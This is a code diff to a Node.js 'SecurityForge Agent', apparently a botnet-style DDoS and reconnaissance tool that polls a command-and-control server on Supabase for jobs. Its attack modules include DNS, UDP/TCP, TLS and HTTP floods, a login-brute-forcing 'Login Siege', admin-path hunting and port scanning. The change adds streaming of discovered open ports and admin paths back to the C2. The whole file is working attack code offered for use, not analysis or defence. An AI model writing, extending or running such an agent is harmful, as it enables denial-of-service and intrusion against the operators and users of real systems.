@@ -1,8 +1,7 @@
 /**
- * SECURITYFORGE AGENT V15.1 (RESTORED)
- * - V13 Core: Dynamic Memory Scaling
- * - V14 Shadow Ops: DNS Reaper, Admin Hunter
- * - V15 Fortress: Login Siege, SSL Storm, Port Scanner (NEW)
+ * SECURITYFORGE AGENT V15.2 (OMNI-LOGGER)
+ * - V15.1: Port Scanner, Login Siege
+ * - V15.2: Live Log Streaming to C2 (Fixes Result Visibility)
  */
 const https = require('https');
 const http = require('http');
@@ -28,7 +27,7 @@ const JUNK_DATA_SMALL = Buffer.alloc(1024 * 1, 'x');
 
 // --- KEEPALIVE SERVER ---
 const PORT = process.env.PORT || 3000;
-http.createServer((req, res) => { res.writeHead(200); res.end('SecurityForge Agent V15.1 ACTIVE'); })
+http.createServer((req, res) => { res.writeHead(200); res.end('SecurityForge Agent V15.2 ACTIVE'); })
     .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));
 
 // --- HELPER: NATIVE SUPABASE ---
@@ -67,16 +66,22 @@ const supabaseRequest = (method, pathStr, body = null) => {
     });
 };
 
-console.log('\x1b[35m[AGENT] Initialized V15.1 (Restored). Polling C2...\x1b[0m');
+console.log('\x1b[35m[AGENT] Initialized V15.2 (Live Stream). Polling C2...\x1b[0m');
 
 let activeJob = null;
 let activeLoop = null;
+let logBuffer = []; // Store logs to send to C2
 
 // --- DYNAMIC SCALING (AUTO-MEM) ---
 const MAX_RAM_BYTES = 400 * 1024 * 1024; 
 const checkMemory = () => {
     const used = process.memoryUsage().heapUsed;
     return used < MAX_RAM_BYTES;
+};
+
+const logToC2 = (msg) => {
+    console.log(msg);
+    logBuffer.push(`[${new Date().toLocaleTimeString()}] ${msg.replace(/\x1b\[[0-9;]*m/g, '')}`); // Strip colors for DB
 };
 
 const startAttack = (job) => {
@@ -95,7 +100,6 @@ const startAttack = (job) => {
     
     // --- MODULE: SHADOW OPS & RECON ---
     if (job.use_dns_reaper) {
-        // DNS Reaper
         const [host, portStr] = job.target.split(':');
         const port = 53;
         const flood = () => {
@@ -111,14 +115,13 @@ const startAttack = (job) => {
         for(let i=0; i<Math.min(job.concurrency, 300); i++) flood();
     }
     else if (job.use_admin_hunter) {
-        // Admin Hunter
         let targetUrl; try { targetUrl = new URL(job.target); } catch(e) { return; }
         const scan = (pathIndex) => {
             if (!running) return;
             const path = ADMIN_PATHS[pathIndex % ADMIN_PATHS.length];
             const opts = { hostname: targetUrl.hostname, path: path, method: 'HEAD', timeout: 3000 };
             const req = https.request(opts, (res) => {
-                if (res.statusCode === 200) console.log(`\x1b[32m[VULN] Found: ${targetUrl.hostname}${path}\x1b[0m`);
+                if (res.statusCode === 200) logToC2(`\x1b[32m[VULN] Found: ${targetUrl.hostname}${path}\x1b[0m`);
                 totalRequests++;
                 if (running) setImmediate(() => scan(pathIndex + 1));
             });
@@ -128,7 +131,6 @@ const startAttack = (job) => {
         for(let i=0; i<20; i++) scan(i);
     }
     else if (job.use_port_scan) {
-        // TCP Port Scanner (V15.1)
         let targetHost = job.target.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0];
         const scanPort = (idx) => {
             if (!running) return;
@@ -136,19 +138,16 @@ const startAttack = (job) => {
             const socket = new net.Socket();
             socket.setTimeout(200);
             socket.on('connect', () => {
-                console.log(`\x1b[32m[OPEN] Port ${port} is OPEN on ${targetHost}\x1b[0m`);
+                logToC2(`\x1b[32m[OPEN] Port ${port} is OPEN on ${targetHost}\x1b[0m`);
                 jobSuccess++; totalRequests++; socket.destroy();
             });
             socket.on('timeout', () => { socket.destroy(); totalRequests++; });
             socket.on('error', () => { totalRequests++; });
             socket.connect(port, targetHost);
-            
             if (running) setTimeout(() => scanPort(idx + 1), 50);
         }
         for(let i=0; i<50; i++) scanPort(i);
     }
-    
-    // --- MODULE: FORTRESS BREAKER ---
     else if (job.use_ssl_storm) {
         let targetUrl; try { targetUrl = new URL(job.target); } catch(e) { return; }
         const host = targetUrl.hostname;
@@ -166,7 +165,6 @@ const startAttack = (job) => {
         };
         for(let i=0; i<Math.min(job.concurrency, 400); i++) storm();
     }
-    // --- MODULE: NETJAM ---
     else if (job.method === 'UDP' || job.method === 'TCP') {
         const [host, portStr] = job.target.split(':');
         const port = parseInt(portStr) || 80;
@@ -191,7 +189,6 @@ const startAttack = (job) => {
         };
         for(let i=0; i<Math.min(job.concurrency, 500); i++) flood(); 
     } 
-    // --- MODULE: STRESSFORGE ---
     else {
         let targetUrl;
         try { targetUrl = new URL(job.target); } catch(e) { return; }
@@ -203,8 +200,6 @@ const startAttack = (job) => {
 
             const lib = targetUrl.protocol === 'https:' ? https : http;
             const start = Date.now();
-            
-            // Login Siege Logic
             let body = job.body;
             let method = job.method || 'GET';
             if (job.use_login_siege) {
@@ -241,7 +236,14 @@ const startAttack = (job) => {
         const rps = Math.floor(totalRequests / elapsed) || 0;
         const avgLat = jobReqsForLatency > 0 ? Math.round(jobLatencySum / jobReqsForLatency) : 0;
         
-        const statsPayload = { current_rps: rps, total_success: jobSuccess, total_failed: jobFailed, avg_latency: avgLat, max_latency: jobMaxLatency };
+        let statsPayload = { current_rps: rps, total_success: jobSuccess, total_failed: jobFailed, avg_latency: avgLat, max_latency: jobMaxLatency };
+        
+        // Append logs if any
+        if (logBuffer.length > 0) {
+            statsPayload.logs = logBuffer.join('\n');
+            logBuffer = []; // Clear buffer after sending
+        }
+
         try { await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, statsPayload); } catch(e) {}
 
         if (duration > 0 && elapsed >= duration) {
